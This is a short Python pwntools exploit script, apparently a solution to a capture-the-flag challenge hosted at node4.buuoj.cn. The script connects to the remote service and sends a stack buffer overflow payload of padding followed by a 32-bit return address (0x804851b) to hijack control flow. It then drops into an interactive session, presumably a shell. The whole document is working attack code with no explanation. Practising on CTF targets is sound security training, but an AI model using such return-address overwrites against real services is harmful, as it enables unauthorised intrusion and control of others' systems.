from pwn import *

io = remote('node4.buuoj.cn', 28890)
payload = b'a'*(0x18+4)+p32(0x804851b)

io.sendline(payload)
io.interactive()